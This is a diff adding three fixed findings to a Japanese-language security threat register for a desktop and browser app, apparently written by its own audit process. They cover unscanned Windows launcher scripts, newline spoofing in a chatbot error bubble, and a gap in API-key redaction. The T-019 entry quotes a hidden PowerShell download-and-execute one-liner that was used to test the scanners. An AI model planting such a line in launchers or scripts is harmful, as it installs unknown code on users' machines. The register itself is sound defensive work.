@@ -525,6 +525,51 @@
         "file": "src/shared/__tests__/rootConfigScanned.test.ts",
         "test": "★ walk は .mjs を走査する —— ESM の実行コードが child_process census に入る (threat: T-018)"
       }
+    },
+    {
+      "id": "T-019",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 516 (supply-chain)",
+      "surface": "supply-chain",
+      "class": "living-off-the-land",
+      "severity": "medium",
+      "title": "配る実行可能ランチャー launcher/*.bat が全コード走査門・整合性チェーン・CODEOWNERS の外に在り、マージ済み PR で download-and-exec を黙って仕込める",
+      "status": "fixed",
+      "fix": "実測 (2026-10-13): `launcher/ServiceHubを開く.bat` (Windows 利用者がダブルクリックして standalone.html を開くランチャー・ファイル自身がそう設計) に `powershell -NoProfile -W Hidden -c \"iwr <url> -OutFile $env:TEMP\\x.exe; Start-Process $env:TEMP\\x.exe\"` の download-and-exec を 1 行足すと、lint:malware / lint:forbidden / lint:shell / lint:charset が 4 門すべて exit 0 (復元 md5 一致)。走査母集団・整合性チェーン・CODEOWNERS のどれにも launcher が無かった —— lint:malware の isScannedPath と lint:forbidden の SCAN_ROOTS はトップレベル dir の固定 allowlist (src|scripts|orchestration|build|assets) で走査母集団を決めるので新しい dir `launcher/` を構造的に見ず (T-016 が直下ファイルで直した固定→git ls-files 動的化が dir レベルに残っていた)、.bat はどの SCAN_EXTS / isWalkedSourceName にも無い (T-018 の拡張子死角の家系)。署名鍵 (release.yml の Build) には届かず・Pages/release の自動配布物にも入らないので victim 配布は『利用者がソースを取ってランチャーを実行する』場合に限る (= ランチャーの用途そのもの)。.bat は Windows シェルで forbidden (JS の形) も shell (bash の形) の規則も当てはまらず、無理に走査門へ入れても PowerShell は捕まらない。正しい機構は『黙った編集を可視化 + 所有者レビュー必須』 —— assets/sw.js や配る maker と同じく整合性チェーンの PROTECTED へ足し CODEOWNERS 被覆は T-003 検査が自動で要求する。将来のランチャー (任意 dir・.bat/.cmd/.ps1/.vbs/.command) は launcherExecutablesGuarded.test.ts が『全部チェーン保護対象』で機械的に強制する (.sh は lint:shell の担当なので除く)。chain:append で新ブロックを採掘。",
+      "regression": {
+        "file": "src/shared/__tests__/launcherExecutablesGuarded.test.ts",
+        "test": "★ 追跡された Windows シェルのランチャーはすべてチェーン保護対象 (threat: T-019)"
+      }
+    },
+    {
+      "id": "T-020",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 516 (ai)",
+      "surface": "ai",
+      "class": "ai-phishing",
+      "severity": "low",
+      "title": "コンシェルジュの invoke 失敗の吹き出しが第三者の失敗本文を折らず、改行でアプリの結果そっくりの行を描かせる",
+      "status": "fixed",
+      "fix": "実測 (2026-10-13): ChatbotWidget.runIntent は serviceHub.invoke の失敗を `append({ role:'bot', text: `⚠ 実行に失敗しました: ${classified.message}` })` で描き、externalTextOnOneLine を通していなかった。classified.message は invoke の戻り値 (第三者 SaaS の応答・ブラウザ版では乗っ取られた / 設定を誤った BYO proxy の本文) を運ぶ。吹き出し (.concierge-msg) は white-space: pre-wrap なので、改行を 1 つ持ち込めば `✅ 実行しました…` のようなアプリの結果そっくりの行を別の行として描ける —— パス 488 (AI アシスタントの失敗の吹き出し) / パス 511・T-005 (同じコンシェルジュの Ollama エラー経路 chatbotOllama.ts:116) が externalTextOnOneLine で塞いだ当の形が、この invoke 失敗の経路だけに残っていた。伏字と長さ切りは choke point (web-shim の err() / main の safeErrorMessage) が既に掛けているが、どちらも実測で改行は残す (redactForMessage は伏せてから切るだけ) ので、足りなかったのは畳みだけ。直し: ChatbotWidget.tsx:417 を externalTextOnOneLine(classified.message) で畳む (Ollama 兄弟と同じ)。T-021 (key_ の裸の反射) と合わせて、伏字 → 畳みの両方がこの経路に掛かる。",
+      "regression": {
+        "file": "src/renderer/components/__tests__/chatbotInvokeFailureFold.test.ts",
+        "test": "★ 改行入りの失敗本文を 1 行に畳む (吹き出しに改行が残らない) (threat: T-020)"
+      }
+    },
+    {
+      "id": "T-021",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 516 (network)",
+      "surface": "network",
+      "class": "ssrf-and-credential-egress",
+      "severity": "low",
+      "title": "redact.ts の裸トークン接頭辞一覧に Cursor の key_ (16 進) が無く、census が実形でない標本で header-only に分類して穴を隠していた",
+      "status": "fixed",
+      "fix": "実測 (2026-10-13・実物の redactSecrets を esbuild で束ねて走らせた): `{\"error\":\"Invalid API key: key_9f2c1a8e4b7d6c5f0a3edead\"}` は素通りし、`Bearer key_…` と `{\"authorization\":\"Bearer key_…\"}` は伏せた。cursor は credentialUse.ts で fetch (資格情報を預かる)・api/cursor.ts が Authorization: Bearer <token> で送り・types.test.ts が Cursor 風 TOKEN に key_9f2c1a8e4b7d6c5f0a3e (16 進) を使う = 発行元が分かる接頭辞を持つ形。ところが redactionCoverage.test.ts の census は cursor を header-only に置き、標本を実形でない 'H'.repeat(40) (接頭辞なし) にしていたので『裸では伏せられなくて正しい』と主張して穴を隠していた (パス 231 が塞いだ『自分の写しを数える』家系の再来)。到達: ブラウザ版の Cursor live-read は BYO proxy 経由で、fetchViaProxy の !proxyRes.ok 枝 (proxy.ts) がプロキシのエラー本文を redactForMessage に通して画面とバグ報告へ出す。乗っ取られた / 設定を誤った Worker が転送された key_… を裸で反射すると伏字を通り抜ける (T-008 / パス 289 と同じ害)。直し: redact.ts に `\\bkey_[0-9a-f]{16,}` を足す —— key_ は散文に現れる接頭辞 (key_press_handler / primary_key_constraint) なので本体を 16 進に絞り、上の [A-Za-z0-9_-] の一括規則に混ぜない (実測で散文 9 形が素通りすることを確認)。census の cursor 行を carrier: prefix・実形の標本 key_9f2c1a8e4b7d6c5f0a3e へ移した。",
+      "regression": {
+        "file": "src/shared/__tests__/redactionCoverage.test.ts",
+        "test": "★ JSON のエラー本文に裸で反射された Cursor の鍵を伏せる (threat: T-021)"
+      }
     }
   ],
   "huntBacklog": [],
